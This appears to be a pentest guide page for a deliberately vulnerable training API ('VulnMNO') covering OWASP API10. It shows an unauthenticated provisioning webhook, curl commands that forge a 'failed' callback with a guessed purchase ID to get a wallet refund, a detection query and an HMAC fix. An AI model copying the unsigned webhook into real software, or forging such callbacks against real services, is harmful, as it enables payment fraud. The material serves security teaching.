# API10 — Unsafe Consumption of APIs · VulnMNO Pentest Guide

> **Status: live — implemented and verified.** The exploitation steps below
> were run against a live instance and the outputs shown are real.

OWASP API Security reference: **API10:2023 — Unsafe Consumption of APIs.**

## Where it lives

- **Endpoint:** `POST /api/shop/webhooks/provisioning-callback`
- **Code:** `app/routers/shop.py::provisioning_callback`

```python
@router.post("/webhooks/provisioning-callback", status_code=status.HTTP_204_NO_CONTENT)
async def provisioning_callback(
    body: dict,
    session: Annotated[AsyncSession, Depends(get_session)],
):
    purchase = (...).scalar_one_or_none()
    if purchase is None:
        return
    purchase.provisioning_status = body.get("status", "active")
    if body.get("status") == "failed":
        # ... credits the customer's wallet for purchase.final_price
```

## Why it is API10

The route has no shared secret, no HMAC signature check, and no sender
allowlist — it trusts the raw inbound JSON body outright and uses it to
mutate real state (a purchase's provisioning status) and trigger a real side
effect (a wallet credit) on the `"failed"` branch. Anyone who can reach the
API port can impersonate the provisioning system with a guessable
`purchaseId` (sequential `PUR-` IDs, `_config/conventions.md`) and no
credentials at all — the textbook "trusting a third-party callback" pattern
API10 exists to catch.

## How to find it (static analysis)

```bash
grep -n "webhook\|callback" src/backend/app/routers/*.py
```

## Verified exploitation (actual run)

```bash
# Balance before
curl -s http://localhost:8000/api/accounts/me/balance -H "Authorization: Bearer $TOKEN"
# -> {"balance":"25.50", ...}

# Customer buys a bundle (legitimately, with a valid token)
curl -s -X POST http://localhost:8000/api/shop/purchases \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"productId":"VOICE-200MIN"}'
# -> {"purchaseId":"PUR-90002", "finalPrice":"4.99", ...}

# Balance after the debit
curl -s http://localhost:8000/api/accounts/me/balance -H "Authorization: Bearer $TOKEN"
# -> {"balance":"20.51", ...}

# EXPLOIT — no Authorization header, no signature, just a guessed purchaseId
curl -s -X POST http://localhost:8000/api/shop/webhooks/provisioning-callback \
  -H 'Content-Type: application/json' \
  -d '{"purchaseId":"PUR-90002","status":"failed"}'
# -> 204 No Content
```

```bash
# Balance after the unauthenticated webhook call
curl -s http://localhost:8000/api/accounts/me/balance -H "Authorization: Bearer $TOKEN"
# -> {"balance":"25.50", ...}   <-- credited back, no auth involved
```

`20.51 → 25.50` (the exact `finalPrice`) triggered entirely by an anonymous
POST with a guessed purchase ID — no genuine provisioning failure ever
occurred.

## Blue-team detection

```sql
-- provisioning_status changes to 'failed' with no matching outbound
-- provisioning-gateway call logged around the same timestamp
SELECT p.public_id, p.provisioning_status, p.created_at
FROM purchases p
WHERE p.provisioning_status = 'failed'
ORDER BY p.created_at DESC;
```

Cross-reference against `app/gateways/provisioning.py` call logs — a
`failed` status with no corresponding outbound attempt is the tell.

## Remediation diff

```diff
+WEBHOOK_SECRET = settings.provisioning_webhook_secret
 async def provisioning_callback(
     request: Request,
     body: dict,
     session: Annotated[AsyncSession, Depends(get_session)],
 ):
+    signature = request.headers.get("X-Provisioning-Signature", "")
+    expected = hmac.new(WEBHOOK_SECRET.encode(), await request.body(), "sha256").hexdigest()
+    if not hmac.compare_digest(signature, expected):
+        raise AppError(ErrorCode.UNAUTHORIZED, "Invalid signature", http_status=401)
```

Plus: validate `body` against a Pydantic model instead of a raw `dict`
before touching any ORM state.
